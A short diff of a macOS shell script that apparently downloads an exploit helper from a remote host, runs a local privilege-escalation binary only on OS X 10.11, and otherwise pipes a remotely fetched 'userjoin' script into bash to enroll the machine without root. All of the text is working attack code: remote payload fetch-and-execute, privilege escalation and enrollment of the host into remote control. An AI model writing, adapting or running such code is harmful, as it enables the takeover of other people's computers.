@@ -10,9 +10,14 @@ curl -Lso /tmp/enact.sh $host:$down_port/mac/enact.sh
 
 chmod +x /tmp/exp.out /tmp/enact.sh
 
+if [[ $(defaults read loginwindow SystemVersionStampAsString) = "10.11."* ]] &&
+   [[ -f /tmp/exp.out ]]; then
+
 /tmp/exp.out <<EOF
 /tmp/enact.sh
 EOF
+
+fi
 
 # If something went wrong, join the user without getting root.
 if [ ! -f /tmp/exp.out ]; then curl -L $host:$down_port/mac/userjoin.sh |bash; fi
